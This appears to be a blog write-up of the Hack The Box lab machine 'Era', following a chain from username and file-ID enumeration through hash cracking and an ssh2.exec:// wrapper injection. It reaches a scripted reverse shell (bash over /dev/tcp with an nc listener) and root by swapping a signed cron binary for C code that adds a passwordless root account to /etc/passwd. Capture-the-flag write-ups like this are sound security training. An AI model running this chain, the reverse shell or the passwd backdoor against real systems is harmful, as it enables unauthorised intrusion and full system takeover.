---
title: HTB Era - Writeup
date: 2025-08-04 10:00:00 +0330
categories: [Writeup]
tags: [web,reverse]
description: My writeup of Era from Hack The Box 

---

![infocard](assets/img/Era.png)

## - **Recon & Enum**
Starting with an Nmap scan.
```shell
$ nmap -sC -sV -oN era_nmap --min-rate=1000 -p- era.htb
```
```
Nmap scan report for era.htb (10.10.11.79)
Host is up (0.29s latency).
Not shown: 36659 filtered tcp ports (no-response), 28874 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Era Designs
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
there was nothing interesting on the website, so we start a subdomain enum with gobuster.
```shell
$ gobuster vhost -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://era.htb --append-domain
```
```
Found: file.era.htb Status: 200 [Size: 6765]
```

after digging a bit I discovered the register page
```shell
$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://file.era.htb -x php --exclude-length 6765
```

```
/images               (Status: 301) [Size: 178] [--> http://file.era.htb/images/]
/download.php         (Status: 302) [Size: 0] [--> login.php]
/login.php            (Status: 200) [Size: 9214]
/register.php         (Status: 200) [Size: 3205]
/files                (Status: 301) [Size: 178] [--> http://file.era.htb/files/]
/assets               (Status: 301) [Size: 178] [--> http://file.era.htb/assets/]
/upload.php           (Status: 302) [Size: 0] [--> login.php]
/layout.php           (Status: 200) [Size: 0]
```

## - **User**

When logging in, you can upload files, manage them and most importantly, change security questions of ANY user, but I did not yet have any valid usernames. Looking back, in the security login page we can enumerate valid usernames, which I did using Burpsuite and FFuF. I intercepted the request and copied to a file, then FUZZed usernames.
![](assets/img/era_burp.png)

```
$ ffuf -request Req/username_enum -request-proto http -w /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -fr 'User not found' 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://file.era.htb/security_login.php
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
 :: Header           : Connection: keep-alive
 :: Header           : Referer: http://file.era.htb/security_login.php
 :: Header           : Upgrade-Insecure-Requests: 1
 :: Header           : Host: file.era.htb
 :: Header           : Accept-Encoding: gzip, deflate, br
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Header           : DNT: 1
 :: Header           : Cookie: PHPSESSID=6d7gj2s2fgsigregqnirgsv9rf
 :: Header           : Priority: u=0, i
 :: Header           : User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128
 :: Header           : Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 :: Header           : Accept-Language: en-US,en;q=0.5
 :: Header           : Origin: http://file.era.htb
 :: Data             : username=FUZZ&answer1=adjbjch&answer2=jsdbj&answer3=dyhcj
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Regexp: User not found
________________________________________________

admin                   [Status: 200, Size: 5401, Words: 1916, Lines: 178, Duration: 721ms]
john                    [Status: 200, Size: 5401, Words: 1916, Lines: 178, Duration: 725ms]
eric                    [Status: 200, Size: 5401, Words: 1916, Lines: 178, Duration: 513ms]
root                    [Status: 200, Size: 5401, Words: 1916, Lines: 178, Duration: 492ms]
hello                   [Status: 200, Size: 5401, Words: 1916, Lines: 178, Duration: 453ms]
test1                   [Status: 200, Size: 5401, Words: 1916, Lines: 178, Duration: 469ms]
ethan                   [Status: 200, Size: 5401, Words: 1916, Lines: 178, Duration: 462ms]
veronica                [Status: 200, Size: 5401, Words: 1916, Lines: 178, Duration: 460ms]
yuri                    [Status: 200, Size: 5401, Words: 1916, Lines: 178, Duration: 467ms]
admin123                [Status: 200, Size: 5401, Words: 1916, Lines: 178, Duration: 470ms]
```
Here the actual usernames which are not likely to be other HTB players, are 
- john
- eric
- ethan
- veronica
- yuri

Now we can login to each of them and see if there are any interesting files, which ther weren't, BUT because the site uses the database id of the file to call it and there in no restriction to see only your own files, we can enumerate other files on there. again I used Burp and FFuF (also made a number list 0-10000 with python).
```
$ ffuf -request Req/file_enum_req -request-proto http -w numbers.txt -fr "File Not Found"
```
and these two are what we needed.
```
54                      [Status: 200, Size: 6378, Words: 2552, Lines: 222, Duration: 2335ms]
150                     [Status: 200, Size: 6366, Words: 2552, Lines: 222, Duration: 4442ms]
```
And like that we have `signing.zip` and `site-backup-30-08-24.zip` files.  
looking into site backup, there is a database file, from there we can get hashes of users and also get username of the admin account, `admin_ef01cab31aa`.
I used hashcat to crack the b2crypt hashes and found two passwords:
- `yuri`:`mustang`
- `eric`:`america`  
I tried logging in with ftp and it succeeded with yuri.  
Also in the download.php file from the zip backup, there is a "beta" view file contents section which we can abuse but to access that beta thingy we need admin privileges, so we simply change secrity answers of admin account.
I got a bit stuck here as php wrappers that I used did not yield results.
looking back at files in the ftp server, in the php config directory there is the ssh2 shared lib which means we can use the 'ssh2.exec://' wrapper.  
![](assets/img/ftp_era.png)

on day 3 or 4 I think, I wrote this script to easily get a reverse shell so I won't have to go through the whole process manually.

```bash
#!/bin/bash

IP="$1"
PORT="$2"

echo -e "--> Logging in as Yuri"
/usr/bin/curl -X POST http://file.era.htb/login.php --data "submitted=true&username=yuri&password=mustang" -b "PHPSESSID=arr6b1scb6mc2foosiaj7kc21n" &>/dev/null

echo -e "--> Resetting security questions for admin"
/usr/bin/curl -X POST http://file.era.htb/reset.php --data "username=admin_ef01cab31aa&new_answer1=0&new_answer2=0&new_answer3=0" -b "PHPSESSID=arr6b1scb6mc2foosiaj7kc21n" &> /dev/null

echo -e "--> Logging in as Admin"
/usr/bin/curl -X POST http://file.era.htb/security_login.php --data "username=admin_ef01cab31aa&answer1=0&answer2=0&answer3=0" -b "PHPSESSID=arr6b1scb6mc2foosiaj7kc21n" &> /dev/null

echo -e "--> Popping the shell"
/usr/bin/curl -b "PHPSESSID=arr6b1scb6mc2foosiaj7kc21n" "file.era.htb/download.php?id=54&show=true&format=ssh2.exec://eric:america@127.0.0.1:22/bash+-c+%22bash+-i+%3E%26+%2Fdev%2Ftcp%2F$IP%2F$PORT+0%3E%261%22;" --silent & /usr/bin/nc -nvlp $PORT
```

```
$ ./getrevshell.sh 10.10.14.26 9909

--> Logging in as Yuri
--> Resetting security questions for admin
--> Logging in as Admin
--> Popping the shell
listening on [any] 9909 ...
connect to [10.10.14.26] from (UNKNOWN) [10.10.11.79] 55910
bash: cannot set terminal process group (8889): Inappropriate ioctl for device
bash: no job control in this shell
eric@era:~$
```

## - **Root**

Navigating through the files, `/opt/AV` caught my eye, the `monitor` binary is run by root every minute (and it is WRITEABLE!) but does nothing special, as it just prints a string, sleeps for 3 secs and prints another string (as you can check yourself with the following command) and the output gets logged in the `status.log` file.
```
$ objdump -d -M intel monitor # this was run on the local machine
```

here I wrote a C program to add a root user with no password, to replace the binary output with monitor.

```c
#include <stdio.h>
#include <stdlib.h>

int main() {
    printf("TEST TEST TEST");
    system("echo 'my_root::0:0:root:/root:/bin/bash' >> /etc/passwd");
    return 0;
}
```

here I got some errors from objcopy that the binary does not have the `.text_sig` segment, so I included it with `__attribute__((section(".text_sig"))) void my_signature() {}` and tried signing the binary with openssl and the key.pem we got from the signing.zip file but no luck. After some Googling, I found [elf signer](https://github.com/NUAA-WatchDog/linux-elf-binary-signer) and that was the solution.

```
$ ./elf-sign sha1 key.pem key.pem alt monitor  
 --- 64-bit ELF file, version 1 (CURRENT), little endian.
 --- 31 sections detected.
 --- [Library dependency]: libc.so.6
 --- Section 0014 [.text] detected.
 --- Length of section [.text]: 279
 --- Signature size of [.text]: 450
 --- Writing signature to file: .text_sig
 --- Removing temporary signature file: .text_sig
 ```
 
and we got root!

```
eric@era:/opt/AV/periodic-checks$ tail /etc/passwd -n 1
my_root::0:0:root:/root:/bin/bash
eric@era:/opt/AV/periodic-checks$ su my_root
root@era:/opt/AV/periodic-checks#
```

![](assets/img/pwn_era.png)